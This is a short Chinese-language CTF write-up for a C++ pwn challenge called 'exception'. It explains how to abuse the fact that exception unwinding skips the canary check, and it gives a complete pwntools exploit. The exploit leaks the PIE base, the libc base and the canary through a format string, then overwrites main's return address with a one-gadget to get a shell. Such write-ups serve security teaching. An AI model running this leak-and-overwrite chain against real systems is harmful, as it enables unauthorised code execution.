# exception 

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |no    |
|libc  |2.31-0ubuntu9.15|

## 解题思路

考察了C++的异常处理，由于给的信息较多，不一定需要利用异常机制

这道题中，`vuln`中的异常抛出后会被`main`中的catch接住，执行完毕后返回`main`，
因此可以保持`vuln`上内容不变，而写`main`函数的返回地址为OneGadget拿shell

另外，throw时不会对当前函数的stack frame上的Canary做检查

> 在dynamic_or_static上花的时间太久了，这道题没时间做了

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './exception'

def payload(lo:int):
    global sh
    if lo:
        if lo & 2:
            sh = gdb.debug(EXE, 'b if $rdi == $rebase(0x2086)')
        else:
            sh = process(EXE)
    else:
        sh = remote('', 9999)
    elf = ELF(EXE)
    libc = ELF('/home/Rocket/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6')
    mainArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2

    sh.sendlineafter(b'name\n', b'%15$p,%12$p,%7$p')
    main, arena, canary = map(lambda x: int(x, 16), sh.recvline().decode().split(','))
    pieBase = main - elf.symbols['main']
    libcBase = arena - mainArena
    sh.recvuntil(b'stack\n')
    rsp = int(sh.recvline(), 16)
    success(GOLD_TEXT(f'Leak PIE base: {hex(pieBase)}'))
    success(GOLD_TEXT(f'Leak libc base: {hex(libcBase)}'))
    success(GOLD_TEXT(f'Leak canary: {hex(canary)}'))
    success(GOLD_TEXT(f'Leak rsp: {hex(rsp)}'))
    
    oneGadget = libcBase + 0xe3b04
    # after throw the control flow goes back to main, so we mod ret addr at main
    sh.send(b'0'*0x70 + p64(rsp + 0xa0) + p64(pieBase + elf.symbols['main'] + 168) + # leave rbp and ret addr unchanged
            p64(0) + p64(canary)*4 + p64(oneGadget))

    sh.clean()
    sh.interactive()
```
